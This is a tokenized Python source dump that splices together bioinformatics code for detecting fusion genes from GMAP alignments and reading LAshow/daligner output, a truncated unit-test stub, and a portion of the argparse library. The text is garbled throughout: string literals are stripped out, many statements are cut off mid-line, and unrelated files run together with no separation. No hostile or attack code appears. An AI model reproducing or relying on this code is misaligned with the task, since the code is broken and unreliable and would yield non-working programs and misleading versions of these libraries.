~~~ return False \n 
\n 
~~ ~~ def merge_fusion_exons ( records , max_fusion_point_dist , max_exon_end_dist , allow_extra_5_exons ) : \n 
~~~ """\n    Records is a list of overlapping GMAP SAM Records (must be on same strand)\n    Unlike regular (non-fusion) mapping, only merge records if:\n\n    (1) for multi-exon, every junction is identical\n        for single-exon, the fusion point is no bigger than <max_fusion_point_dist> apart\n\n    (2) if allow_extra_5_exons is False, number of exons must be the same\n        if allow_extra_5_exons is True, only merge if the extension is in the 5\' direction\n\n    Returns a list of grouped records, ex: [[r1,r2], [r3], [r4, r5, r6]]....\n    which can be sent to BranchSimple.process_records for writing out\n    """ \n 
output = [ [ records [ 0 ] ] ] \n 
for r1 in records [ 1 : ] : \n 
~~~ merged = False \n 
# go through output, seeing if mergeable \n 
for i , r2s in enumerate ( output ) : \n 
#            if r1.qID in _ids and any(r2.qID in _ids for r2 in r2s): \n 
#                pdb.set_trace() \n 
~~~ if all ( is_fusion_compatible ( r1 , r2 , max_fusion_point_dist , max_exon_end_dist , allow_extra_5_exons ~~~ output [ i ] . append ( r1 ) \n 
merged = True \n 
break \n 
~~ ~~ if not merged : \n 
~~~ output . append ( [ r1 ] ) \n 
~~ ~~ return output \n 
\n 
~~ def iter_gmap_sam_for_fusion ( gmap_sam_filename , fusion_candidates , transfrag_len_dict ) : \n 
~~~ """\n    Iterate through a sorted GMAP SAM file\n    Continuously yield a group of overlapping records {\'+\': [r1, r2, ...], \'-\': [r3, r4....]}\n    """ \n 
records = [ ] \n 
iter = BioReaders . GMAPSAMReader ( gmap_sam_filename , True , query_len_dict = transfrag_len_dict ) \n 
for r in iter : \n 
~~~ if r . qID in fusion_candidates : \n 
~~~ records = [ r ] \n 
break \n 
\n 
~~ ~~ for r in iter : \n 
~~~ if len ( records ) >= 1 and ( r . sID == records [ - 1 ] . sID and r . sStart < records [ - 1 ] . sStart ) : \n 
~~~ print >> sys . stderr , "SAM file is NOT sorted. ABORT!" \n 
sys . exit ( - 1 ) \n 
~~ if len ( records ) >= 1 and ( r . sID != records [ 0 ] . sID or r . sStart > records [ - 1 ] . sEnd ) : \n 
~~~ yield ( sep_by_strand ( records ) ) \n 
records = [ ] \n 
~~ if r . qID in fusion_candidates : \n 
~~~ records . append ( r ) \n 
\n 
~~ ~~ if len ( records ) > 0 : \n 
~~~ yield ( sep_by_strand ( records ) ) \n 
\n 
\n 
~~ ~~ def find_fusion_candidates ( sam_filename , query_len_dict , min_locus_coverage = .05 , min_locus_coverage_bp ~~~ """\n    Return list of fusion candidates qIDs\n    (1) must map to 2 or more loci\n    (2) minimum coverage for each loci is 5% AND minimum coverage in bp is >= 1 bp\n    (3) total coverage is >= 95%\n    (4) distance between the loci is at least 10kb\n    """ \n 
TmpRec = namedtuple ( , [ , , , , , , ] ) \n 
def total_coverage ( tmprecs ) : \n 
~~~ tree = ClusterTree ( 0 , 0 ) \n 
for r in tmprecs : tree . insert ( r . qStart , r . qEnd , - 1 ) \n 
return sum ( reg [ 1 ] - reg [ 0 ] for reg in tree . getregions ( ) ) \n 
\n 
~~ d = defaultdict ( lambda : [ ] ) \n 
reader = BioReaders . GMAPSAMReader ( sam_filename , True , query_len_dict = query_len_dict ) \n 
for r in reader : \n 
~~~ if r . sID == : continue \n 
if r . flag . strand == : \n 
~~~ d [ r . qID ] . append ( TmpRec ( qCov = r . qCoverage , qLen = r . qLen , qStart = r . qStart , qEnd = r . qEnd , sStart ~~ else : \n 
~~~ d [ r . qID ] . append ( TmpRec ( qCov = r . qCoverage , qLen = r . qLen , qStart = r . qLen - r . qEnd , qEnd = r . qLen - ~~ ~~ fusion_candidates = [ ] \n 
for k , data in d . iteritems ( ) : \n 
\n 
~~~ if len ( data ) > 1 and all ( a . iden >= .95 for a in data ) and all ( a . qCov >= min_locus_coverage for a in data ) and all ( a . qCov * a . qLen >= min_locus_coverage_bp for a in data ) and total_coverage ( data ) * 1. / data [ 0 ] . qLen >= min_total_coverage and all ( max ( a . sStart , b . sStart ) - min ( a . sEnd , b . sEnd ) >= min_dist_between_loci for a , b in itertools . combinations ( data , 2 ) ) : \n 
~~~ fusion_candidates . append ( k ) \n 
~~ ~~ return fusion_candidates \n 
\n 
~~ def fusion_main ( fa_or_fq_filename , sam_filename , output_prefix , is_fq = False , allow_extra_5_exons = True ~~~ """\n    (1) identify fusion candidates (based on mapping, total coverage, identity, etc)\n    (2) group/merge the fusion exons, using an index to point to each individual part\n    (3) use BranchSimple to write out a tmp GFF where \n         PBfusion.1.1 is the first part of a fusion gene\n         PBfusion.1.2 is the second part of a fusion gene\n    (4) read the tmp file from <3> and modify it so that \n         PBfusion.1 just represents the fusion gene (a single transcript GFF format)\n    """ \n 
compressed_records_pointer_dict = defaultdict ( lambda : [ ] ) \n 
merged_exons = [ ] \n 
merged_i = 0 \n 
\n 
# step (0). check for duplicate IDs \n 
check_ids_unique ( fa_or_fq_filename , is_fq = is_fq ) \n 
\n 
# step (1). identify fusion candidates \n 
bs = branch_simple2 . BranchSimple ( fa_or_fq_filename , is_fq = is_fq ) \n 
fusion_candidates = find_fusion_candidates ( sam_filename , bs . transfrag_len_dict , min_locus_coverage \n 
# step (2). merge the fusion exons \n 
for recs in iter_gmap_sam_for_fusion ( sam_filename , fusion_candidates , bs . transfrag_len_dict ) : \n 
~~~ for v in recs . itervalues ( ) : \n 
~~~ if len ( v ) > 0 : \n 
~~~ o = merge_fusion_exons ( v , max_fusion_point_dist = 100 , max_exon_end_dist = 0 , allow_extra_5_exons for group in o : \n 
~~~ merged_exons . append ( group ) \n 
for r in group : compressed_records_pointer_dict [ r . qID ] . append ( merged_i ) \n 
merged_i += 1 \n 
\n 
# step (3). use BranchSimple to write a temporary file \n 
\n 
~~ ~~ ~~ ~~ f_group = open ( , ) \n 
#    f_bad = f_good \n 
gene_index = 1 \n 
already_seen = set ( ) \n 
for qid , indices in compressed_records_pointer_dict . iteritems ( ) : \n 
~~~ combo = tuple ( indices ) \n 
if combo in already_seen : \n 
~~~ print "combo seen:" , combo \n 
#raw_input("") \n 
continue \n 
~~ already_seen . add ( combo ) \n 
#        if gene_index == 7: \n 
#            pdb.set_trace() \n 
for isoform_index , i in enumerate ( indices ) : \n 
~~~ bs . cuff_index = gene_index # for set to the same \n 
records = merged_exons [ i ] \n 
f_group . write ( "{p}.{i}.{j}\\t{ids}\\n" . format ( p = "PBfusion" , i = gene_index , j = isoform_index , #            bs.process_records(records, allow_extra_5_exons, skip_5_exon_alt, \\ \n 
#                    f_good, f_bad, f_group, tolerate_end=100, \\ \n 
\n 
~~ gene_index += 1 \n 
#    f_good.close() \n 
#    f_bad.close() \n 
~~ f_group . close ( ) \n 
\n 
\n 
# step (4). read the tmp file and modify to display per fusion gene \n 
f_group = open ( output_prefix + , ) \n 
group_info = { } # ex: PBfusion.1 --> [id1, id2, id3...] \n 
count = 0 \n 
with open ( ) as f : \n 
~~~ while True : \n 
~~~ line = f . readline ( ) . strip ( ) \n 
if len ( line ) == 0 : break \n 
pbid1 , groups1 = line . strip ( ) . split ( ) \n 
pbid2 , groups2 = f . readline ( ) . strip ( ) . split ( ) \n 
assert pbid1 . split ( ) [ 1 ] == pbid2 . split ( ) [ 1 ] \n 
group = set ( groups1 . split ( ) ) . intersection ( groups2 . split ( ) ) \n 
f_group . write ( "{0}\\t{1}\\n" . format ( pbid1 [ : pbid1 . rfind ( ) ] , "," . join ( group ) ) ) \n 
group_info [ pbid1 [ : pbid1 . rfind ( ) ] ] = list ( group ) \n 
count += 1 \n 
~~ ~~ f_group . close ( ) \n 
\n 
\n 
gff_filename = output_prefix + \n 
group_filename = output_prefix + \n 
if is_fq : \n 
~~~ output_filename = output_prefix + \n 
~~ else : \n 
~~~ output_filename = output_prefix + \n 
~~ pick_rep ( fa_or_fq_filename , sam_filename , gff_filename , group_filename , output_filename , is_fq = is_fq \n 
print >> sys . stderr , "{0} fusion candidates identified." . format ( count ) \n 
print >> sys . stderr , "Output written to: {0}.gff, {0}.group.txt, {1}" . format ( output_prefix , output_filename \n 
# (optional) step 5. get count information \n 
if prefix_dict_pickle_filename is not None : \n 
~~~ with open ( prefix_dict_pickle_filename ) as f : \n 
~~~ d = load ( f ) \n 
d1 = d [ ] \n 
d1 . update ( d [ ] ) \n 
~~ tofu_wrap . get_abundance ( output_prefix , d1 , output_prefix ) \n 
print >> sys . stderr , "Count information written to: {0}.abundance.txt" . format ( output_prefix ) \n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ from argparse import ArgumentParser \n 
\n 
parser = ArgumentParser ( ) \n 
parser . add_argument ( "--input" , help = "Input FA/FQ filename" ) \n 
parser . add_argument ( "--fq" , default = False , action = "store_true" , help = "Input is a fastq file (default is fasta)" parser . add_argument ( "-s" , "--sam" , required = True , help = "Sorted GMAP SAM filename" ) \n 
parser . add_argument ( "-o" , "--prefix" , required = True , help = "Output filename prefix" ) \n 
parser . add_argument ( "--dun-merge-5-shorter" , action = "store_false" , dest = "allow_extra_5exon" , default parser . add_argument ( "--prefix_dict_pickle_filename" , default = None , help = "Quiver HQ/LQ Pickle filename for generating count information (optional)" parser . add_argument ( "-c" , "--min_locus_coverage" , type = float , default = 0.05 , help = "Minimum per-locus coverage in percentage (default: 0.05)" parser . add_argument ( "--min_locus_coverage_bp" , type = int , default = 1 , help = "Minimum per-locus coverage in bp (default: 1 bp)" parser . add_argument ( "-t" , "--min_total_coverage" , type = float , default = 0.99 , help = "Minimum total coverage (default: 0.99)" parser . add_argument ( "-d" , "--min_dist_between_loci" , type = int , default = 10000 , help = "Minimum distance between loci, in bp (default: 10000)" \n 
args = parser . parse_args ( ) \n 
\n 
fusion_main ( args . input , args . sam , args . prefix , \n 
is_fq = args . fq , allow_extra_5_exons = args . allow_extra_5exon , \n 
skip_5_exon_alt = False , prefix_dict_pickle_filename = args . prefix_dict_pickle_filename , min_locus_coverage = args . min_locus_coverage , min_locus_coverage_bp = args . min_locus_coverage_bp min_total_coverage = args . min_total_coverage , \n 
min_dist_between_loci = args . min_dist_between_loci ) \n 
\n 
\n 
~~ __author__ = \n 
\n 
import pdb \n 
import os , sys , subprocess \n 
import numpy \n 
from pbtools . pbtranscript . io . BLASRRecord import BLASRRecord \n 
from pbtools . pbtranscript . ice . IceUtils import HitItem , eval_blasr_alignment , alignment_has_large_nonmatch from pbtools . pbtranscript . ice . c_IceAlign import get_ece_arr_from_alignment \n 
class LAshowAlignReader : \n 
~~~ """\n    Reader for using LAshow with -a option that gives the alignments\n    """ \n 
def __init__ ( self , las_out_filename ) : \n 
~~~ self . las_out_filename = las_out_filename \n 
self . f = open ( las_out_filename ) \n 
\n 
~~ def __iter__ ( self ) : \n 
~~~ return self \n 
\n 
~~ def next ( self ) : \n 
~~~ """\n        Should be the printed out of running:\n        LA4Ice -m -i0 -w100000 -b0 -a:{db} {las}\n        """ \n 
# first line is BLASR-like output \n 
# ex: 000000002 000002845 -1192 85.12 0 1855 3082 3082 0 2324 3516 3517 overlap \n 
# if is - strand, then strand=1, start=S, end=E means the sequence is \n 
# seq[S:E].reverse_complement() \n 
\n 
raw = self . f . readline ( ) . strip ( ) . split ( ) \n 
if raw [ 0 ] == and raw [ 1 ] == : # FALCON-added EOF signature \n 
~~~ raise StopIteration \n 
~~ qID = int ( raw [ 0 ] ) + 1 # convert to 1-based \n 
sID = int ( raw [ 1 ] ) + 1 # convert to 1-based \n 
score = int ( raw [ 2 ] ) \n 
iden = float ( raw [ 3 ] ) \n 
qStrand = int ( raw [ 4 ] ) \n 
qStart = int ( raw [ 5 ] ) # 0-based \n 
qEnd = int ( raw [ 6 ] ) \n 
qLen = int ( raw [ 7 ] ) \n 
sStrand = int ( raw [ 8 ] ) \n 
sStart = int ( raw [ 9 ] ) \n 
sEnd = int ( raw [ 10 ] ) \n 
sLen = int ( raw [ 11 ] ) \n 
\n 
self . f . readline ( ) # blank line \n 
_qStart , qAln = self . f . readline ( ) . strip ( ) . split ( ) \n 
assert ( qStrand == 0 and int ( _qStart ) - 1 == qStart ) or ( qStrand == 1 and int ( _qStart ) - 1 == qLen alnStr = self . f . readline ( ) . strip ( ) \n 
_sStart , sAln = self . f . readline ( ) . strip ( ) . split ( ) [ : 2 ] \n 
assert ( sStrand == 0 and int ( _sStart ) - 1 == sStart ) or ( sStrand == 1 and int ( _sStart ) - 1 == sLen return BLASRRecord ( qID , qLen , qStart , qEnd , qStrand , sID , sLen , sStart , sEnd , sStrand , score qAln = qAln , alnStr = alnStr , sAln = sAln , identity = iden , strand = if qStrand == sStrand \n 
\n 
~~ ~~ def dalign_against_ref ( dazz_query_obj , dazz_db_obj , las_out_filename , is_FL , sID_starts_with_c , \n 
qver_get_func , qvmean_get_func , qv_prob_threshold = .03 , \n 
ece_penalty = 1 , ece_min_len = 20 , same_strand_only = True , no_qv_or_aln_checking = False max_missed_start = 200 , max_missed_end = 50 ) : \n 
~~~ """\n    Excluding criteria:\n    (1) self hit\n    (2) opposite strand hit  (should already be in the same orientation;\n        can override with <same_strand_only> set to False)\n    (3) less than 90% aligned or more than 50 bp missed\n\n    qver_get_func --- should be basQV.basQVcacher.get() or\n                      .get_smoothed(), or can just pass in\n                      lambda (x, y): 1. to ignore QV\n    """ \n 
for r in LAshowAlignReader ( las_out_filename ) : \n 
#pdb.set_trace() \n 
~~~ missed_q = r . qStart + r . qLength - r . qEnd \n 
missed_t = r . sStart + r . sLength - r . sEnd \n 
\n 
r . qID = dazz_query_obj [ r . qID ] \n 
r . sID = dazz_db_obj [ r . sID ] \n 
if sID_starts_with_c : \n 
# because all consensus should start with \n 
# c<cluster_index> \n 
~~~ assert r . sID . startswith ( ) \n 
if r . sID . find ( ) > 0 : \n 
~~~ r . sID = r . sID . split ( ) [ 0 ] \n 
~~ if r . sID . endswith ( ) : \n 
# probably c<cid>_ref \n 
~~~ cID = int ( r . sID [ 1 : - 4 ] ) \n 
~~ else : \n 
~~~ cID = int ( r . sID [ 1 : ] ) \n 
~~ ~~ else : \n 
~~~ cID = r . sID \n 
\n 
\n 
# self hit, useless! \n 
\n 
# opposite strand not allowed! \n 
~~ if ( cID == r . qID or \n 
( r . strand == and same_strand_only ) ) : \n 
~~~ yield HitItem ( qID = r . qID , cID = cID ) \n 
continue \n 
\n 
# (Liz) this is used for partial_uc/nFL reads only \n 
# simply accepts hits from daligner for the nFL partial hits \n 
# testing shows that it does not affect much the Quiver consensus calling \n 
~~ if no_qv_or_aln_checking : \n 
~~~ yield HitItem ( qID = r . qID , cID = cID , \n 
qStart = r . qStart , qEnd = r . qEnd , \n 
missed_q = missed_q * 1. / r . qLength , \n 
missed_t = missed_t * 1. / r . sLength , \n 
fakecigar = 1 , \n 
ece_arr = 1 ) \n 
continue \n 
\n 
\n 
\n 
\n 
~~ if ( is_FL and ( r . sStart > max_missed_start or r . qStart > max_missed_start or \n 
( r . sLength - r . sEnd > max_missed_end ) or \n 
( r . qLength - r . qEnd > max_missed_end ) ) ) : \n 
~~~ yield HitItem ( qID = r . qID , cID = cID ) \n 
~~ else : \n 
~~~ cigar_str , ece_arr = eval_blasr_alignment ( \n 
record = r , \n 
qver_get_func = qver_get_func , \n 
sID_starts_with_c = sID_starts_with_c , \n 
qv_prob_threshold = qv_prob_threshold , \n 
qvmean_get_func = qvmean_get_func ) \n 
\n 
\n 
\n 
if alignment_has_large_nonmatch ( ece_arr , \n 
ece_penalty , ece_min_len ) : \n 
~~~ yield HitItem ( qID = r . qID , cID = cID ) \n 
~~ else : \n 
~~~ yield HitItem ( qID = r . qID , cID = cID , \n 
qStart = r . qStart , qEnd = r . qEnd , \n 
missed_q = missed_q * 1. / r . qLength , \n 
missed_t = missed_t * 1. / r . sLength , \n 
fakecigar = cigar_str , \n 
ece_arr = ece_arr ) \n 
\n 
\n 
~~ ~~ ~~ ~~ """Test initICE.""" \n 
\n 
import unittest \n 
\n 
class TestInitICE ( unittest . TestCase ) : \n 
~~~ """Class for testing initICE.""" \n 
def setUp ( self ) : \n 
~~~ """Set up testDir, dataDir, outDir, stdoutDir.""" \n 
self . rootDir = op . dirname ( op . dirname ( op . abspath ( __file__ ) ) ) \n 
self . testDir = op . join ( self . rootDir , "" ) \n 
# Author: Steven J. Bethard <steven.bethard@gmail.com>. \n 
\n 
~~ ~~ """Command-line parsing library\n\nThis module is an optparse-inspired command-line parsing library that:\n\n    - handles both optional and positional arguments\n    - produces highly informative usage messages\n    - supports parsers that dispatch to sub-parsers\n\nThe following is a simple usage example that sums integers from the\ncommand-line and writes the result to a file::\n\n    parser = argparse.ArgumentParser(\n        description=\'sum the integers at the command line\')\n    parser.add_argument(\n        \'integers\', metavar=\'int\', nargs=\'+\', type=int,\n        help=\'an integer to be summed\')\n    parser.add_argument(\n        \'--log\', default=sys.stdout, type=argparse.FileType(\'w\'),\n        help=\'the file where the sum should be written\')\n    args = parser.parse_args()\n    args.log.write(\'%s\' % sum(args.integers))\n    args.log.close()\n\nThe module contains the following public classes:\n\n    - ArgumentParser -- The main entry point for command-line parsing. As the\n        example above shows, the add_argument() method is used to populate\n        the parser with actions for optional and positional arguments. Then\n        the parse_args() method is invoked to convert the args at the\n        command-line into an object with attributes.\n\n    - ArgumentError -- The exception raised by ArgumentParser objects when\n        there are errors with the parser\'s actions. Errors raised while\n        parsing the command-line are caught by ArgumentParser and emitted\n        as command-line messages.\n\n    - FileType -- A factory for defining types of files to be created. As the\n        example above shows, instances of FileType are typically passed as\n        the type= argument of add_argument() calls.\n\n    - Action -- The base class for parser actions. Typically actions are\n        selected by passing strings like \'store_true\' or \'append_const\' to\n        the action= argument of add_argument(). However, for greater\n        customization of ArgumentParser actions, subclasses of Action may\n        be defined and passed as the action= argument.\n\n    - HelpFormatter, RawDescriptionHelpFormatter, RawTextHelpFormatter,\n        ArgumentDefaultsHelpFormatter -- Formatter classes which\n        may be passed as the formatter_class= argument to the\n        ArgumentParser constructor. HelpFormatter is the default,\n        RawDescriptionHelpFormatter and RawTextHelpFormatter tell the parser\n        not to change the formatting for help text, and\n        ArgumentDefaultsHelpFormatter adds information about argument defaults\n        to the help.\n\nAll other classes in this module are considered implementation details.\n(Also note that HelpFormatter and RawDescriptionHelpFormatter are only\nconsidered public as object names -- the API of the formatter objects is\nstill considered an implementation detail.)\n""" \n 
\n 
__version__ = \n 
__all__ = [ \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
] \n 
\n 
\n 
import copy as _copy \n 
import os as _os \n 
import re as _re \n 
import sys as _sys \n 
import textwrap as _textwrap \n 
\n 
from gettext import gettext as _ \n 
\n 
try : \n 
~~~ set \n 
~~ except NameError : \n 
# for python < 2.4 compatibility (sets module is there since 2.3): \n 
~~~ from sets import Set as set \n 
\n 
~~ try : \n 
~~~ basestring \n 
~~ except NameError : \n 
~~~ basestring = str \n 
\n 
~~ try : \n 
~~~ sorted \n 
~~ except NameError : \n 
# for python < 2.4 compatibility: \n 
~~~ def sorted ( iterable , reverse = False ) : \n 
~~~ result = list ( iterable ) \n 
result . sort ( ) \n 
if reverse : \n 
~~~ result . reverse ( ) \n 
~~ return result \n 
\n 
\n 
~~ ~~ def _callable ( obj ) : \n 
~~~ return hasattr ( obj , ) or hasattr ( obj , ) \n 
\n 
\n 
~~ SUPPRESS = \n 
\n 
OPTIONAL = \n 
ZERO_OR_MORE = \n 
ONE_OR_MORE = \n 
PARSER = \n 
REMAINDER = \n 
_UNRECOGNIZED_ARGS_ATTR = \n 
\n 
# ============================= \n 
# Utility functions and classes \n 
# ============================= \n 
\n 
class _AttributeHolder ( object ) : \n 
~~~ """Abstract base class that provides __repr__.\n\n    The __repr__ method returns a string in the format::\n        ClassName(attr=name, attr=name, ...)\n    The attributes are determined either by a class-level attribute,\n    \'_kwarg_names\', or by inspecting the instance __dict__.\n    """ \n 
\n 
def __repr__ ( self ) : \n 
~~~ type_name = type ( self ) . __name__ \n 
arg_strings = [ ] \n 
for arg in self . _get_args ( ) : \n 
~~~ arg_strings . append ( repr ( arg ) ) \n 
~~ for name , value in self . _get_kwargs ( ) : \n 
~~~ arg_strings . append ( % ( name , value ) ) \n 
~~ return % ( type_name , . join ( arg_strings ) ) \n 
\n 
~~ def _get_kwargs ( self ) : \n 
~~~ return sorted ( self . __dict__ . items ( ) ) \n 
\n 
~~ def _get_args ( self ) : \n 
~~~ return [ ] \n 
\n 
\n 
~~ ~~ def _ensure_value ( namespace , name , value ) : \n 
~~~ if getattr ( namespace , name , None ) is None : \n 
~~~ setattr ( namespace , name , value ) \n 
~~ return getattr ( namespace , name ) \n 
\n 
\n 
# =============== \n 
# Formatting Help \n 
# =============== \n 
\n 
~~ class HelpFormatter ( object ) : \n 
~~~ """Formatter for generating usage messages and argument help strings.\n\n    Only the name of this class is considered a public API. All the methods\n    provided by the class are considered an implementation detail.\n    """ \n 
\n 
def __init__ ( self , \n 
prog , \n 
indent_increment = 2 , \n 
max_help_position = 24 , \n 
width = None ) : \n 
\n 
# default setting for width \n 
~~~ if width is None : \n 
~~~ try : \n 
~~~ width = int ( _os . environ [ ] ) \n 
~~ except ( KeyError , ValueError ) : \n 
~~~ width = 80 \n 
~~ width -= 2 \n 
\n 
~~ self . _prog = prog \n 
self . _indent_increment = indent_increment \n 
self . _max_help_position = max_help_position \n 
self . _width = width \n 
\n 
self . _current_indent = 0 \n 
self . _level = 0 \n 
self . _action_max_length = 0 \n 
\n 
self . _root_section = self . _Section ( self , None ) \n 
self . _current_section = self . _root_section \n 
\n 
self . _whitespace_matcher = _re . compile ( ) \n 
self . _long_break_matcher = _re . compile ( ) \n 
\n 
# =============================== \n 
# Section and indentation methods \n 
# =============================== \n 
~~ def _indent ( self ) : \n 
~~~ self . _current_indent += self . _indent_increment \n 
self . _level += 1 \n 
\n 
~~ def _dedent ( self ) : \n 
~~~ self . _current_indent -= self . _indent_increment \n 
assert self . _current_indent >= 0 , \n 
self . _level -= 1 \n 
\n 
~~ class _Section ( object ) : \n 
\n 
~~~ def __init__ ( self , formatter , parent , heading = None ) : \n 
~~~ self . formatter = formatter \n 
self . parent = parent \n 
self . heading = heading \n 
self . items = [ ] \n 
\n 
~~ def format_help ( self ) : \n 
# format the indented section \n 
~~~ if self . parent is not None : \n 
~~~ self . formatter . _indent ( ) \n 
~~ join = self . formatter . _join_parts \n 
for func , args in self . items : \n 
~~~ func ( * args ) \n 
~~ item_help = join ( [ func ( * args ) for func , args in self . items ] ) \n 
if self . parent is not None : \n 
~~~ self . formatter . _dedent ( ) \n 
\n 
# return nothing if the section was empty \n 
~~ if not item_help : \n 
~~~ return \n 
\n 
# add the heading if the section was non-empty \n 
~~ if self . heading is not SUPPRESS and self . heading is not None : \n 
~~~ current_indent = self . formatter . _current_indent \n 
heading = % ( current_indent , , self . heading ) \n 
~~ else : \n 
~~~ heading = \n 
\n 
# join the section-initial newline, the heading and the help \n 
~~ return join ( [ , heading , item_help , ] ) \n 
\n 
~~ ~~ def _add_item ( self , func , args ) : \n 
~~~ self . _current_section . items . append ( ( func , args ) ) \n 
\n 
# ======================== \n 
# Message building methods \n 
# ======================== \n 
~~ def start_section ( self , heading ) : \n 
~~~ self . _indent ( ) \n 
section = self . _Section ( self , self . _current_section , heading ) \n 
self . _add_item ( section . format_help , [ ] ) \n 
self . _current_section = section \n 
\n 
~~ def end_section ( self ) : \n 
~~~ self . _current_section = self . _current_section . parent \n 
self . _dedent ( ) \n 
\n 
~~ def add_text ( self , text ) : \n 
~~~ if text is not SUPPRESS and text is not None : \n 
~~~ self . _add_item ( self . _format_text , [ text ] ) \n 
\n 
~~ ~~ def add_usage ( self , usage , actions , groups , prefix = None ) : \n 
~~~ if usage is not SUPPRESS : \n 
~~~ args = usage , actions , groups , prefix \n 
self . _add_item ( self . _format_usage , args ) \n 
\n 
~~ ~~ def add_argument ( self , action ) : \n 
~~~ if action . help is not SUPPRESS : \n 
\n 
# find all invocations \n 
~~~ get_invocation = self . _format_action_invocation \n 
invocations = [ get_invocation ( action ) ] \n 
for subaction in self . _iter_indented_subactions ( action ) : \n 
~~~ invocations . append ( get_invocation ( subaction ) ) \n 
\n 
# update the maximum item length \n 
~~ invocation_length = max ( [ len ( s ) for s in invocations ] ) \n 
action_length = invocation_length + self . _current_indent \n 
self . _action_max_length = max ( self . _action_max_length , \n 
action_length ) \n 
\n 
# add the item to the list \n 
self . _add_item ( self . _format_action , [ action ] ) \n 
\n 
~~ ~~ def add_arguments ( self , actions ) : \n 
~~~ for action in actions : \n 
~~~ self . add_argument ( action ) \n 
\n 
# ======================= \n 
# Help-formatting methods \n 
# ======================= \n 
~~ ~~ def format_help ( self ) : \n 
~~~ help = self . _root_section . format_help ( ) \n 
if help : \n 
~~~ help = self . _long_break_matcher . sub ( , help ) \n 
help = help . strip ( ) + \n 
~~ return help \n 
\n 
~~ def _join_parts ( self , part_strings ) : \n 
~~~ return . join ( [ part \n 
for part in part_strings \n 
if part and part is not SUPPRESS ] ) \n 
\n 
~~ def _format_usage ( self , usage , actions , groups , prefix ) : \n 
~~~ if prefix is None : \n 
~~~ prefix = _ ( ) \n 
\n 
# if usage is specified, use that \n 
~~ if usage is not None : \n 
~~~ usage = usage % dict ( prog = self . _prog ) \n 
\n 
# if no optionals or positionals are available, usage is just prog \n 
~~ elif usage is None and not actions : \n 
~~~ usage = % dict ( prog = self . _prog ) \n 
\n 
# if optionals and positionals are available, calculate usage \n 
~~ elif usage is None : \n 
~~~ prog = % dict ( prog = self . _prog ) \n 
\n 
# split optionals from positionals \n 
optionals = [ ] \n 
positionals = [ ] \n 
for action in actions : \n 
~~~ if action . option_strings : \n 
~~~ optionals . append ( action ) \n 
~~ else : \n 
~~~ positionals . append ( action ) \n 
\n 
# build full usage string \n 
~~ ~~ format = self . _format_actions_usage \n 
action_usage = format ( optionals + positionals , groups ) \n 
usage = . join ( [ s for s in [ prog , action_usage ] if s ] ) \n 
\n 
\n 
text_width = self . _width - self . _current_indent \n 
if len ( prefix ) + len ( usage ) > text_width : \n 
\n 
# break usage into wrappable parts \n 
~~~ part_regexp = \n 
opt_usage = format ( optionals , groups ) \n 
pos_usage = format ( positionals , groups ) \n 
opt_parts = _re . findall ( part_regexp , opt_usage ) \n 
pos_parts = _re . findall ( part_regexp , pos_usage ) \n 
assert . join ( opt_parts ) == opt_usage \n 
assert . join ( pos_parts ) == pos_usage \n 
\n 
# helper for wrapping lines \n 
def get_lines ( parts , indent , prefix = None ) : \n 
~~~ lines = [ ] \n 
line = [ ] \n 
if prefix is not None : \n 
~~~ line_len = len ( prefix ) - 1 \n 
~~ else : \n 
~~~ line_len = len ( indent ) - 1 \n 
~~ for part in parts : \n 
~~~ if line_len + 1 + len ( part ) > text_width : \n 
~~~ lines . append ( indent + . join ( line ) ) \n 
line = [ ] \n 
line_len = len ( indent ) - 1 \n 
~~ line . append ( part ) \n 
line_len += len ( part ) + 1 \n 
~~ if line : \n 
~~~ lines . append ( indent + . join ( line ) ) \n 
~~ if prefix is not None : \n 
~~~ lines [ 0 ] = lines [ 0 ] [ len ( indent ) : ] \n 
~~ return lines \n 
\n 
# if prog is short, follow it with optionals or positionals \n 
~~ if len ( prefix ) + len ( prog ) <= 0.75 * text_width : \n 
~~~ indent = * ( len ( prefix ) + len ( prog ) + 1 ) \n 
if opt_parts : \n 
~~~ lines = get_lines ( [ prog ] + opt_parts , indent , prefix ) \n 
lines . extend ( get_lines ( pos_parts , indent ) ) \n 
~~ elif pos_parts : \n 
~~~ lines = get_lines ( [ prog ] + pos_parts , indent , prefix ) \n 
~~ else : \n 
~~~ lines = [ prog ] \n 
\n 
# if prog is long, put it on its own line \n 
~~ ~~ else : \n 
~~~ indent = * len ( prefix ) \n 
parts = opt_parts + pos_parts \n 
lines = get_lines ( parts , indent ) \n 
if len ( lines ) > 1 : \n 
~~~ lines = [ ] \n 
lines . extend ( get_lines ( opt_parts , indent ) ) \n 
lines . extend ( get_lines ( pos_parts , indent ) ) \n 
~~ lines = [ prog ] + lines \n 
\n 
# join lines into usage \n 
~~ usage = . join ( lines ) \n 
\n 
\n 
~~ ~~ return % ( prefix , usage ) \n 
\n 
~~ def _format_actions_usage ( self , actions , groups ) : \n 
# find group indices and identify actions in groups \n 
~~~ group_actions = set ( ) \n 
inserts = { } \n 
for group in groups : \n 
~~~ try : \n 
~~~ start = actions . index ( group . _group_actions [ 0 ] ) \n 
~~ except ValueError : \n 
~~~ continue \n 
~~ else : \n 
~~~ end = start + len ( group . _group_actions ) \n 
if actions [ start : end ] == group . _group_actions : \n 
~~~ for action in group . _group_actions : \n 
~~~ group_actions . add ( action ) \n 
~~ if not group . required : \n 
~~~ if start in inserts : \n 
~~~ inserts [ start ] += \n 
~~ else : \n 
~~~ inserts [ start ] = \n 
~~ inserts [ end ] = \n 
~~ else : \n 
~~~ if start in inserts : \n 
~~~ inserts [ start ] += \n 
~~ else : \n 
~~~ inserts [ start ] = \n 
~~ inserts [ end ] = \n 
~~ for i in range ( start + 1 , end ) : \n 
~~~ inserts [ i ] = \n 
\n 
# collect all actions format strings \n 
~~ ~~ ~~ ~~ parts = [ ] \n 
for i , action in enumerate ( actions ) : \n 
\n 
# suppressed arguments are marked with None \n 
# remove | separators for suppressed arguments \n 
~~~ if action . help is SUPPRESS : \n 
~~~ parts . append ( None ) \n 
if inserts . get ( i ) == : \n 
~~~ inserts . pop ( i ) \n 
~~ elif inserts . get ( i + 1 ) == : \n 
~~~ inserts . pop ( i + 1 ) \n 
\n 
# produce all arg strings \n 
~~ ~~ elif not action . option_strings : \n 
~~~ part = self . _format_args ( action , action . dest ) \n 
\n 
\n 
if action in group_actions : \n 
~~~ if part [ 0 ] == and part [ - 1 ] == : \n 
